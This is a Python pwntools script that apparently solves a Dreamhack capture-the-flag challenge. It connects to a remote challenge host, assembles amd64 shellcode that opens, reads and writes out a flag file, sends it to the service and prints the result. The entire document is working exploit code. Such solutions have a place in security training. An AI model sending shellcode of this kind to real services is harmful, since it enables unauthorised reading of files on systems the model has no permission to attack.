from pwn import *

p = remote('host3.dreamhack.games', 11857)

# attck target archiecture: x86-64 == amd64
context.arch = 'amd64'
# flag file path to open
flag_path = "/home/shell_basic/flag_name_is_loooooong"

shellcode = shellcraft.open(flag_path)
# rax == fd: return value of syscall is stored rax
# rsp == buf: buf's address is rsp's current position
shellcode += shellcraft.read('rax', 'rsp', 0x100)
shellcode += shellcraft.write(1, 'rsp', 0x100)
# translating shellcode to machine language
shellcode = asm(shellcode)

payload = shellcode
p.sendlineafter("shellcode: ", payload)
print(p.recv(0x30))
